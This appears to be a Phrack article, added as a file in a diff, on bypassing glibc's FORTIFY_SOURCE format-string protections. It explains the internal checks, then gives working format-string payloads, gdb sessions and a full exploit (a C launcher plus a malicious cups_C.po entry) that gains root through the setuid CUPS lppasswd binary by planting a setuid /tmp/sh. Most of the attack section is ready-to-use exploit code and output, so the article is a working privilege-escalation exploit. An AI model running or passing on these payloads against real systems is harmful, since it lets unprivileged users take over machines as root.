@@ -1,0 +1,835 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x43, Phile #0x09 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ A Eulogy for Format Strings ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=-----------------------=[ by Captain Planet ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+Index
+
+------[ 0. Introduction
+------[ 1. Glibc's FORTIFY_SOURCE
+------[ 2. Bypassing FORTIFY_SOURCE
+------[ 3. Exploitation
+          A.  Dummy program
+          B.  CUPS lppasswd bug
+          C.  TODO- ASLR
+------[ 4. Afterword
+
+
+------[ 0. Introduction
+
+Today the Windows CRT disables %n by default [0]. And likewise, glibc's
+FORTIFY_SOURCE patches provides protection mechanisms which render 
+exploitation impossible. Objective-C isn't being considered, but i'm told 
+you can have plenty of fun there too. Even format strings weren't a 
+critically endangered species, they've been demoted to the class of 
+infoleak. The great thing about format strings of course was that they 
+provided both a read and write primitive. They were the `spork` of 
+exploitation. ASLR? PIE? NX Stack/Heap? No problem, fmt had you covered.
+
+The story goes that around 2000 everybody was hunting down format strings.
+Just about everything was vulnerable. Check out the TESO article in the 
+links. It was pretty outrageous. CORE exploited pretty much everything with
+locales too [1]. But today, those days are long one. Unless of course 
+you're hacking edus, in which case you can still use locale bugs to pop 
+root shells on PMOS technology.
+
+A few months ago something funny happened. A guy by the name of Ronald
+Volgers [2] had his way with CUPS lppasswd, which was shipped root setuid 
+in Ubuntu and Debian. Nice find man! Locale bugs, oh yeah, awesome!
+
+Unfortunately, the aforementioned patch makes fmt str exploitation quite
+unlikely.
+
+In detail, the FORTIFY_SOURCE provides two countermeasures against fmt
+strings.
+
+  1)   Format strings containing the %n specifier may not be located at a
+       writeable address in the memory space of the application.
+
+  2)   When using positional parameters, all arguments within the range 
+       must be consumed. So to use %7$x, you must also use 1,2,3,4,5 and 6.
+
+But thats okay since the FORTIFY_SOURCE patch is not really all that 
+complete. (-: Why? Because glibc is really really weird code. It amazes me 
+that someone would travel all around the world and take credit for glibc 
+when they did not even write it. Actually, it makes perfect sense, nobody 
+with any dignity would admit to writing any part of glibc to public 
+audiences. Don't get me wrong, glibc lets pretty good stuff happen to my 
+computer. The code is pretty hard to look at though, you wouldn't introduce
+her to your parents if you know what I mean...
+
+What you're about to read is slightly harder than writing a format string
+and a little bit easier than building glibc itself. (Glibc binaries are 
+ideal for an ELF VX because of the difficulty of compiling them). 
+Prequisites are understanding format string exploitation. They were last 
+written about in phrack here [3] if you need a refresher. If you have never
+exploited a format string vuln, seek the article by 'rebel' [6]. It is one 
+of the most skilled and digestible discourses available.
+
+So lets dive right in.
+
+------[ 1. Glibc's FORTIFY_SOURCE
+
+===========================================================================
+WARNING: THE REST OF THIS ARTICLE INCLUDES GLIBC CODE WHICH MAY INDUCE 
+CHEST PAIN, VOMITING, BLACKOUTS, or PERMANENT LOSS OF EYESIGHT. ALL 
+ATTEMPTS TO KEEP KEEP GLIBC CODE TO A MINIMUM HAVE BEEN MADE BY THE AUTHOR.
+===========================================================================
+
+"%49150u %4849$hn %1$*269158540$x %1$*13996$x %1073741824$d"
+
+Have you seen a format string like that before? It makes positional 
+parameters look less attractive, doesn't it?
+
+So how does this patch supposedly work?
+
+To turn it on the binary must be compiled with `-D_FORTIFY_SOURCE=2` 
+enabled with an optimization level of at least -O2. This is likely because 
+of the compiler pass the patch is implemented at.
+
+So the following happens.
+
+   0x08048509 <+57>:  mov    %ebx,0x4(%esp)
+   0x0804850d <+61>:  movl   $0x1,(%esp)
+   0x08048514 <+68>:  call   0x80483c4 <__printf_chk@plt>
+
+First, calls to printf, etc get rerouted to __*_chk in your compiled binary
+and the first argument of :flag: is passed as 1.
+
+A.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+File: libc/debug/printf_chk.c
+
+/* Write formatted output to stdout from the format string FORMAT.  */
+int
+___printf_chk (int flag, const char *format, ...)
+{
+  va_list ap;
+  int done;
+
+  _IO_acquire_lock_clear_flags2 (stdout);
+  if (flag > 0)
+    stdout->_flags2 |= _IO_FLAGS2_FORTIFY;
+
+  va_start (ap, format);
+  done = vfprintf (stdout, format, ap);
+  va_end (ap);
+
+  if (flag > 0)
+    stdout->_flags2 &= ~_IO_FLAGS2_FORTIFY;
+  _IO_release_lock (stdout);
+
+  return done;
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The function sets the _IO_FLAGS2_FORTIFY bit to ON in the FILE* structure 
+to enable the FORTIFY checks. This is sort of clever, as the bit will 
+always get toggled on when entering dangerous functions. You can not 
+universally disable the mechanism very easily. But this itself does not 
+actually guarantee any kind of security.
+
+Under libio/libio.h the following secondary flags are defined:
+
+#define _IO_FLAGS2_MMAP 1         //fopen 'm' mmap access mode
+#define _IO_FLAGS2_NOTCANCEL 2    //open/read/write should not be used as
+                                    thread cancellization points
+#ifdef _LIBC
+# define _IO_FLAGS2_FORTIFY 4     //enable fortify security checks
+#endif
+#define _IO_FLAGS2_USER_WBUF 8    //wide buffer (2-byte) support funk
+#ifdef _LIBC
+# define _IO_FLAGS2_SCANF_STD 16  // %a support for scanf
+#endif
+
+Disabling the entire flags buffer should not be too much trouble, but may
+lead to some inconsistencies if the file stream pointer is opened with 'm' 
+in the mode parameter.
+
+The astute reader will be wondering about functions such as vsnprintf, 
+which require no file stream pointer. Well, glibc provides an okay 
+solution. A file stream pointer is made on the stack with a callback that 
+writes to a buffer instead of a file descriptor. This file stream pointer 
+is then passed along to vfprintf.
+
+Now, with the _IO_FLAGS2_FORTIFY bit set, there are two protections that 
+are enabled.
+
+B. Protection #1
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+File: libc/stdio-common/vfprintf.c
+
+   LABEL (form_number):
+\
+      if (s->_flags2 &
+_IO_FLAGS2_FORTIFY)                                    \
+
+{                                                                     \
+          if (!
+readonly_format)                                              \
+
+{                                                                 \
+              extern int __readonly_area (const void *,
+size_t)               \
+
+attribute_hidden;                                             \
+
+readonly_format                                                 \
+                = __readonly_area (format, ((STR_LEN (format) +
+1)            \
+                                            * sizeof
+(CHAR_T)));              \
+
+}                                                                 \
+          if (readonly_format <
+0)                                            \
+            __libc_fatal ("*** %n in writable segment detected
+***\n");       \
+
+}                                                                     \
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+If the format string payload containing a %n is located in a writeable 
+memory area such as the stack or BSS or DATA or the heap, this patch will 
+detect it and error out. Besides a DoS, this patch renders format strings 
+pretty harmless.
+
+
+C. Protection #2
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+File: libc/stdio-common/vfprintf.c
+    /* Determine the number of arguments the format string consumes.  */
+    nargs = MAX (nargs, max_ref_arg);
+
+    /* Allocate memory for the argument descriptions.  */
+    args_type = alloca (nargs * sizeof (int));
+    memset (args_type, s->_flags2 & _IO_FLAGS2_FORTIFY ? '\xff' : '\0',
+            nargs * sizeof (int));
+    args_value = alloca (nargs * sizeof (union printf_arg));
+    args_size = alloca (nargs * sizeof (int));
+..
+    for (cnt = 0; cnt < nargs; ++cnt)
+..
+      switch (args_type[cnt])
+..
+        case -1:
+          /* Error case.  Not all parameters appear in N$ format
+             strings.  We have no way to determine their type.  */
+          assert (s->_flags2 & _IO_FLAGS2_FORTIFY);
+          __libc_fatal ("*** invalid %N$ use detected ***\n");
+        }
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The effect of this second patch is that all of the arg_types are set to -1
+by default. If there are any argument holes in between which do not get 
+processed, they are left as -1. So the effect is that:
+
+  %4$x
+
+would be invalid but
+
+  %4$x %2$x %1$x %3x
+
+would be okay.
+
+To be honest, I do not really see this as some huge security improvement 
+but more of a nuisance. It does not really stop infoleaks much. Maybe they
+wanted to prevent people from exploiting 8 character format strings, 
+because those are really common in the wargaming scene.
+
+
+------[ 2. Bypassing FORTIFY_SOURCE
+
+Now, if you were paying attention, you saw a bunch of allocas in 1-A. That 
+:nargs: variable, that is the calculated maximum number of arguments. If a 
+fmt str has simple arguments, the value is just that number. But, if a fmt 
+str uses width arguments or positional parameters (often called direct 
+parameters in other format string articles), then those also factor into 
+the maximum :nargs: value
+
+As an example in this string,
+%x %x %x %13981938$x,
+
+13981938 is the :nargs: value being passed to the alloca functions in code
+snippet 1-C.
+
+Do not get too excited. This is not enough for generic control. 
+Unfortunately, we can not do the same stack shifting as in [4] since we are
+in a context past the initial stack frame allocation. At the epilogue of 
+the function, a base register will be used to collapse the stack, making 
+stack shifting less useful without being accompanied by memory clobbering. 
+This is true of many of the architecture's C compilers. They pretty much 
+all implement some sort of easy stack clean-up with a base register, so 
+alloca itself is difficult to attack.
+
+Instead, it is the operations that use the allocated memory that must be
+exploited. The integer overflow can be used to trigger all sorts of memory
+trespasses.
+
+One other thing to do is shift the stack into the heap using the alloca. 
+This also turns out to be difficult because of those memset operations.
+
+But we do have a loss of state. And as always, from a loss of state new
+opportunites arise. We are in the land of undefined. Hi mom and dad!
+
+This article will use one such trespass opportunity to bypass 
+FORTIFY_SOURCE. It should be noted that others exist, but may be a bit 
+harder to utilize than this one.
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+Arbitrary 4-byte NUL overwrite.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+File: stdio-common/vfprintf.c
+
+    /* Fill in the types of all the arguments.  */
+    for (cnt = 0; cnt < nspecs; ++cnt)
+      {
+      /* If the width is determined by an argument this is an int.  */
+      if (specs[cnt].width_arg != -1)
+        args_type[specs[cnt].width_arg] = PA_INT;
+
+enum
+{                               /* C type: */
+  PA_INT,                       /* int */
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Quick summary of the code:
+args_type[ ATTACKER_OFFSET ] = 0x00000000;
+
+Explanation:
+The above code is required to process width arguments that are passed in as
+parameters.
+
+For example:
+
+        %1$*269096872$x
+
+Effectively does:
+        //specs[cnt].width_arg = 269096872
+        args_type[specs[cnt].width_arg] = 0
+
+..which, if your stack is set up just right, can toggle off that 
+_IO_FLAGS2_FORTIFY bit in the `stdout` FILE structure.
+
+Remember that :args_type: was one of the buffers allocated on the stack in
+the alloca snippet above in 1-C and is an array of an integer base type.
+
+Care must be taken as the alloca becomes a bit of a problem when nargs gets
+set to a large value. This will likely shift the stack to somewhere 
+unmapped. The next push or call instructions would result in a crash, 
+preventing proper exploitation.
+
+So the key constraints around :nargs: are as follows:
+
+1) the stack must be shifted somewhere sane
+2) the memset operation must not hit an unmapped page.
+
+The easiest way to meet these two contraints is to use an integer overflow.
+Since no bounds checking occurs on :nargs:, you can artificially keep the
+stack in-place with this: `%1073741824$`. No specifier is really required 
+and you can end it with just a $ sign. The second contraint is also 
+satisfied because the memset will be called with a length parameter of 0.
+
+The details of the allocas are a little bit more complex if you look at the
+assembly. For our purposes, they roughly end up doing:
+
+esp -= nargs * (4)
+esp -= nargs * (12)
+esp -= nargs * (4)
+
+The 1073471824*4 happens to be 0 when truncated into a 32-bit integer. This
+and other factors of 1073471824 prove to be sufficient for side-stepping 
+the alloca constraints.
+
+This concludes the arbitrary 4-byte NUL overwrite.
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+The first patch (1-B) can be disabled by clearing that IO_FLAGS2_FORTIFY 
+bit in the file stream pointer. Typically it will be the only flag enabled 
+on the file stream pointer. In the unlikeley case that one of the other 
+bits was set, for example _IO_FLAGS2_MMAP, inconsitencies may arise when 
+the file stream pointer is closed. This may or may not affect 
+exploitability.
+
+We will now revisit the second part of the patch. It makes any format 
+string exploit less flexible. The loop on nargs has to be terminated early 
+to avoid the assert and the libc_fatal when a "hole" in the arguments is 
+discovered. By hole, I am referring to the code in (1-C) which checks the 
+:args_type: value against -1. Remember that the fortify source patch won't 
+let you access %5$x without also accessing %1$? %2$? %3$? and %4?. That is 
+what is meant by 'hole' in this context.
+
+The termination of that loop can coincidentally happen all by itself if the
+stack is aligned correctly. The loop will hit out of bounds of the alloca 
+created buffers and self terminate when :nargs: is set to 0, provided that
+:nargs: is stored by the compiler on the stack. If it fails to do this, an 
+assert() statemet will be triggered, preventing exploitation.
+
+Or, we can reuse the 4-byte NUL write can be used to bypass the loop 
+reliably.
+
+One instance of a successful bypass can then be performed in two easy 
+steps.
+
+ 1. Turn off the IO_FORTIFY_SOURCE bit to allow %n from a writeable address
+ 2. Set nargs=0 to skip the value-filling loop.
+
+Note that bypassing the loop via #2 requires us to dig further down the 
+stack to find our user input since the same loop is responsible for filling
+in the args_value array. If you have ever attempted to exploit a format
+string by truncating a pointer and reusing it as destination on glibc, you 
+probably failed because of that args_value array.
+
+------[ 3. Exploitation
+
+In standard phrack style we will first do this on a test binary and then on
+a real-world binary to disprove any accusations of academic tendencies, 
+like thought experiments. Feel free to skip to part B.
+
+------------[ A. Dummy Test Program for clarity
+
+Note: ASLR is disabled and the program has an executable stack.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+//File: test.c
+//gcc -D_FORTIFY_SOURCE=2 -O2
+int main(){
+  char buf[256];
+  fgets(buf, sizeof(buf), stdin);
+  printf(buf);
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+captain@planet:~/research/fmt/article$ ./a.out
+%n
+*** %n in writable segment detected ***
+Aborted
+captain@planet:~/research/fmt/article$ ./a.out
+%4$x
+*** invalid %N$ use detected ***
+Aborted
+
+Oh nooO! Scary format string protections are making everything hurt.
+
+ENABLE POWER MORPHING LINUX SHARING COMMUNITY POWER
+----
+Alright remember the process kids.
+1. Disable fortify source
+2. Set nargs = 0
+3. Enjoy the %n
+
+So first, lets figure out where that arbitrary 4-byte NUL write is on our
+system. We will pick some ridiculous desination, like %1$*269168516$. If it
+doesn't crash, keep incrementing that by about 20000.
+
+So we'll send the following as our investigative payload. The first part
+should trigger the NUL write. The second part should keep the stack sane.
+
+%1$*269168516$x %1073741824$
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+captain@planet:~/research/fmt/article$ gdb -q ./a.out
+Reading symbols from /home/captain/research/fmt/article/a.out...(no
+debugging symbols found)...done.
+(gdb) r
+Starting program: /home/captain/research/fmt/article/a.out
+%1$*269168516$x %1073741824$
+
+Program received signal SIGSEGV, Segmentation fault.
+0x001888f1 in _IO_vfprintf_internal (s=0x29f4e0, format=0xbffeb2dc
+"%1$*269168516$x %1073741824$\n", ap=0xbffeb2c8 "@\364)") at vfprintf.c:1735
+1735  vfprintf.c: No such file or directory.
+  in vfprintf.c
+(gdb) x/i $pc
+=> 0x1888f1 <_IO_vfprintf_internal+11489>:  movl   $0x0,(%ecx,%eax,4)
+(gdb)
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The fortify source bit will be somewhere inside of the file stream pointer
+over at s=0x29f4e0.
+
+    stdout->_flags2 |= _IO_FLAGS2_FORTIFY;
+
+On this target machine, it happens to be @+60
+
+0x29f51c <_IO_2_1_stdout_+60>:  0x00000004
+
+Since the operations here are relative, ASLR is not too big of an issue and
+once you find your offset, it's pretty consistent (YMMV).
+
+Here is the equation
+$ecx + $eax*4  should = 0x29f51c
+
+(gdb) p/d ((0x10029f51c-$ecx) & 0xffffffff)/4
+$11 = 269145003
+
+Counting starts from 0, so add 1 to that for the payload.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+captain@planet:~/research/fmt/article$ gdb -q ./a.out
+Reading symbols from /home/captain/research/fmt/article/a.out...(no
+debugging symbols found)...done.
+(gdb) break vfprintf
+Function "vfprintf" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (vfprintf) pending.
+(gdb) r
+Starting program: /home/captain/research/fmt/article/a.out
+%1$*269145004$x %1073741824$
+
+Breakpoint 1, _IO_vfprintf_internal (s=0x29f4e0, format=0xbffeb2dc
+"%1$*269145004$x %1073741824$\n", ap=0xbffeb2c8 "@\364)") at vfprintf.c:210
+210  vfprintf.c: No such file or directory.
+  in vfprintf.c
+(gdb) tbreak *(vfprintf+11489)
+Temporary breakpoint 2 at 0x1888f1: file vfprintf.c, line 1735.
+(gdb) c
+Continuing.
+
+Temporary breakpoint 2, 0x001888f1 in _IO_vfprintf_internal (s=0x29f4e0,
+format=0xbffeb2dc "%1$*269145004$x %1073741824$\n", ap=0xbffeb2c8 "@\364)")
+    at vfprintf.c:1735
+1735  in vfprintf.c
+(gdb) x/i $pc
+=> 0x1888f1 <_IO_vfprintf_internal+11489>:  movl   $0x0,(%ecx,%eax,4)
+(gdb) x/wx $ecx+$eax*4
+0x29f51c <_IO_2_1_stdout_+60>:  0x00000004
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+This operation has to be repeated for :nargs:. The easiest way to locate
+:nargs: is to pick a value you know (0xdeadbeef), and find it on the stack 
+or just pick it up where it gets loaded before the alloca code.
+
+%1$*3735928559$x
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+Program received signal SIGSEGV, Segmentation fault.
+0x0018880f in _IO_vfprintf_internal (s=0x29f4e0, format=0xbffeb2dc
+"%1$*3735928559$x\n", ap=0xbffeb2c8 "@\364)") at vfprintf.c:1721
+1721  vfprintf.c: No such file or directory.
+  in vfprintf.c
+(gdb) x/wx $ebp-0x4bc
+0xbffeadcc:  0xdeadbeef
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+p/d (0xbffeadcc-$ecx)/4+1
+= 472 for me
+
+Disabling both :nargs: and fortify source : [%*472$ %1$*269145004$
+%1073741824$]
+
+Well, that's not actually true. It depends on what your buffer looks like.
+For example if you attempt to do:
+
+%49150u %4847$hn %*472$ %1$*269145004$ %1073741824$
+
+The first two parameters will cause the stack to shift and the values have 
+to be recalculated based on the size of that $hn offset. This gets a bit 
+hairy, but with some grunt work you'll be done. The next task is finding
+a good way to hijack flow control.
+
+One good vector happens to be a call to free shortly after the %n write.
+
+=> 0xb7d4f3f8 <_IO_vfprintf_internal+2024>:  mov    -0x4bc(%ebp),%edi
+=> 0xb7d4f3fe <_IO_vfprintf_internal+2030>:  mov    %edi,(%esp)
+=> 0xb7d4f401 <_IO_vfprintf_internal+2033>:  call   0xb7d28988 <free@plt>
+=> 0xb7d28988 <free@plt>:  jmp    *0x24(%ebx)
+(gdb) x/wx $ebx+0x24
+0x29f018:  0x001b8e60
+
+We will overwrite the upper 16-bits to point into the stack
+(0x001b->0xbfff).
+Write Dest: 0x29f01a
+
+One way to smuggle this value is using a command line argument.
+
+%49150u %4847$hn %*13996$ %1$*269158528$ %1073741824$
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+Program received signal SIGSEGV, Segmentation fault.
+0x0018880f in _IO_vfprintf_internal (s=0x29f4e0, format=0xbffeb2dc
+"%1$*3735928559$x\n", ap=0xbffeb2c8 "@\364)") at vfprintf.c:1721
+1721  vfprintf.c: No such file or directory.
+  in vfprintf.c
+(gdb) x/wx $ebp-0x4bc
+0xbffeadcc:  0xdeadbeef
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+So after some fenagling you'll reach something like this:
+
+A great improvement would be automation via instrumentation or mapping
+out the stack shifting very tightly.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+captain@planet:~/research/fmt/article$ export PAY=`python -c 'print
+"\xcc"*4096*20'`
+captain@planet:~/research/fmt/article$ (python -c 'print "%49150u %4847$hn
+%1$*269168516$x %1$*13996$x %1073741824$"')
+                                      | ./a.out `echo -ne "a ccc ddbbb
+\x1a\xf0\x29 fffff"`
+...
+            Trace/breakpoint trap (core dumped)
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+
+------------[ B. The real world exploit
+
+===========================================================================
+===========================================================================
+===========================================================================
+
+CUPS locale() vulnerability.
+
+Ronald Volgers noticed that lppasswd used user-specified locales. A few
+distributions (debian, ubuntu, fedora?) ship lppasswd setuid root. Is this
+awesome? yes
+
+ls -al lppasswd
+-rwsr-xr-x 1 root root 19144 2010-07-07 00:56 lppasswd
+
+To exploit it, you just export LOCALEDIR to a place where 
+$LOCALEDIR/C/cups_C.po holds the format strings for the various printfs in 
+lppasswd.
+
+This exploit turns out to be hard for a few reasons. The first, it is non
+interactive. That is, the format string can not be used for an info leak to
+bypass ASLR. The second limitation is that lppasswd creates a LOCK file, so
+any weaponized exploit must be highly reliable. Luckily this second one can
+be bypassed with resource limits.
+
+File: sploit_filz.c
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#include <sys/resource.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/time.h>
+
+int main(int argc, char *argv[])
+{
+  struct rlimit rara;
+  int keke[4096*4];
+  char test[0x10000];
+  char *args[] = { "./lppasswd", 0 };
+  char *env[] = { "LOCALEDIR=./", &keke, test, 0};
+  int riri;
+  int jmp = 0xbffdc66c;
+
+  memset(test, 0x01, sizeof(test));
+  test[0x10000-1] = 0x00;
+
+  for(riri = 0; riri < sizeof(keke)/sizeof(int); riri+=4){
+    keke[riri+0] = jmp+2;
+    keke[riri+1] = jmp+2;
+    keke[riri+2] = jmp;
+    keke[riri+3] = jmp;
+  }
+
+  rara.rlim_max = rara.rlim_cur = atoi(argv[1]);
+  setrlimit(RLIMIT_NOFILE, &rara);
+
+  execve("./lppasswd",args,env);
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+There is also one important difference between the test program and 
+lppasswd. The vulnerability inside libcups is triggered by vsnprintf. 
+Internally, vsnprintf creates a fake file stream pointer on the stack and 
+then passes it to vfprintf.
+
+This is actually pretty good news in terms of bypassing ASLR as the file
+stream pointer is a fixed offset from the format string structures, which 
+glibc allocates on the stack.
+
+The vulnerable function in libcups follows.
+
+File: cups/cups/langprintf.c
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+int          /* O - Number of bytes written */
+_cupsLangPrintf(FILE        *fp,  /* I - File to write to */
+          const char  *message,  /* I - Message string to use */
+          ...)      /* I - Additional arguments as needed */
+{
+
+...
+
+  va_start(ap, message);
+  vsnprintf(buffer, sizeof(buffer),
+            _cupsLangString(cg->lang_default, message), ap);
+  va_end(ap);
+..
+}
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+With ASLR disabled, the best option is to go after the return address. In 
+the callstack for vfprintf:
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+Breakpoint 1, _IO_vfprintf_internal (s=0xbffdc68c,
+    format=0x1187a0 "chown root:root /tmp/sh; chmod 4755 /tmp/sh; %49150u
+%7352$hx %49150u %7353$hx %14263u %7352$hn %27249u %7353$hn %1$*14951$x
+%1$*14620$x %1073741824$", ap=0xbffdefe8 "\243>\344\267-\021\021") at
+vfprintf.c:210
+210  in vfprintf.c
+(gdb) bt
+#0  _IO_vfprintf_internal (s=0xbffdc68c,
+    format=0x1187a0 "chown root:root /tmp/sh; chmod 4755 /tmp/sh; ...
+#1  0xb7df2bf4 in ___vsnprintf_chk (s=0xbffde7bc "", maxlen=2048, flags=1,
+    slen=2048,
+    format=0x1187a0 "chown root:root /tmp/sh; chmod 4755 /tmp/sh; ....
+#2  0xb7f96544 in vsnprintf (fp=0xb7e68580,
+    message=0x1117c5 "lppasswd: Unable to open password file: %s\n")
+    at /usr/include/bits/stdio2.h:78
+#3  _cupsLangPrintf (fp=0xb7e68580,
+    message=0x1117c5 "lppasswd: Unable to open password file: %s\n")
+    at langprintf.c:125
+#4  0x0011116a in main (argc=1, argv=0xbffdfee4) at lppasswd.c:316
+(gdb)
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The second return address lends itself very well to exploitation. The 2nd
+parameter points to user input. This is highly useful when overwriting the 
+saved return address.
+The address can be pointed to &system or __libc_system or do_system, and 
+the old 2nd argument will become the argument to system.
+
+Above in the resource limit setting code, the enivornment is filled with
+pointers to that return address::  int jmp = 0xbffdc66c;
+
+    keke[riri+0] = jmp+2;
+    keke[riri+1] = jmp+2;
+    keke[riri+2] = jmp;
+    keke[riri+3] = jmp;
+
+NX Bypass: C/cups_C.po
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+msgid "lppasswd: Unable to open password file: %s\n"
+msgstr "chown root:root /tmp/sh; chmod 4755 /tmp/sh; %49150u %7352$hx
+%49150u \
+%7353$hx %14263u %7352$hn %27249u %7353$hn %1$*14951$x %1$*14620$x
+%1073741824$"
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+The first part executes a command. The next 4 arguments were padding but
+removing them would have required some recalculations.
+
+These two writes redirect control flow to system by overwriting the least
+and most significant half-words of the saved return address.
+
+%14263u %7352$hn %27249u %7353$hn
+
+And the last part is used to bypass FORTIFY_SOURCE:  
+%1$*14951$x %1$*14620$x %1073741824$.
+
+Overall, things are pretty hairy, but they work with some massaging.
+
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ ls -l lppasswd
+-rwsr-xr-x 1 root root 18867 2010-06-06 01:26 lppasswd
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ ls -al /tmp/sh
+ls: cannot access /tmp/sh: No such file or directory
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ cp /bin/bash /tmp/sh
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ gcc -o sf sploit_filz.c
+sploit_filz.c: In function ?main?:
+sploit_filz.c:13: warning: initialization from incompatible pointer type
+sploit_filz.c:20: warning: incompatible implicit declaration of built-in
+function ?memset?
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ ./sf 4
+Enter old password:
+Enter password:
+Enter password again:
+sh: %49150u: not found
+Segmentation fault
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ ls -al /tmp/sh
+-rwsr-xr-x 1 root root 818232 2010-07-07 01:26 /tmp/sh
+captain@planet:~/research/fmt/cups-1.4.2/systemv$ /tmp/sh -p
+sh-4.1# id
+uid=1337(captain) gid=1337(captain) euid=0(root)
+groups=4(adm),20(dialout),24(cdrom),29(audio),30(dip),44(video),46(plugdev)
+,104(lpadmin),112(netdev),115(admin),118(pulse-access),120(sambashare),
+1000(captain)
+
+
+------------[ C. TODO- ASLR
+
+The author has failed to make an ultra reliable exploit for defeating both
+ALSR and an NX stack. Part of what makes it difficult is all of the moving
+parts.
+
+In this case ASLR makes things hairy for two reasons. Both the stack and 
+libc (and the text) are shifting. They are randomly offset from each other.
+In the above exploit, two values need to be known. The first is the 
+location of the saved return address. The second is the address of glibc. 
+By applying the resource limits, it is still possible to brute force this 
+vulnerability, but it requires patience with 24-bits of entropy.
+
+Anyway, the following two methods have been attempted.
+
+1) Copy (read+write) primitive using width arguments.
+
+The width argument can be used to read a value from memory and write it
+somewhere.
+
+%1$*100$u will read the 100th argument's value, and write that many spaces.
+This is presumably the reason why %n was introduced in the first place. The
+copy would look like this:
+
+%1$*100$u %2$101$n
+
+Author's Verdict: Too hairy
+The copy write primitive does not seem to work reliably under the fortify
+source loss of state. Exact reasons have not been yet determined, and a way
+to stabilize them may exist. In addition, once a copy operation is 
+performed, the internal printf counter must be reset by writing a value 
+numerous times. The easiest way to do this would be to print out the same 
+value '256' times and reduce write width to one-character at a time. 
+Writing the same value '256' times ensures that the lowest byte of the 
+internal counter will be 0.
+
+2) Repurpose double stack pointers
+
+For lppasswd, stack double-pointers exist that can be repurposed. For %n to
+work, a pointer is needed. The idea behind this avenue is to use the first 
+pointer to redirect the second pointer to the return address.
+
+Author's verdict: Using the pointers is reliable, but ASLR has enough 
+entropy in the the correct offset to the return address is unreliable. The 
+best acheivement was 24-bits of entropy, 12-bits for the return address and
+12-bits for &system. Only one exploit seemed to work, and the author was 
+unable to reproduce even after a night of testing.
+
+===========================================================================
+
+------[ 4. Afterword
+
+It is the author's opinion that it is quite amazing vfprintf even compiles
+in the first place. Briefly, it should be noted that there are more angles 
+of attack in the vfprintf code that are a bit more complicated. Although 
+quite messy. Here is one example, if a target is using the deprecated 
+features of vfprintf to register their own format string specifiers, an 
+attacker can get arbitrary code execution without needing %n. Execution 
+without %n may even be possible with the jump table implementations...
+
+This article is dedicated to runixd and beist, the top scoring two of the
+first three loller skaterz. Mad greetz to the even better lollerskaterz 
+dropping from rofl copters. Surf the chaos dudes!
+
+Many thanks to the phrack staff for their help.
+And also real hackers who make me blush.
+
+Thanks for reading. Have phun!
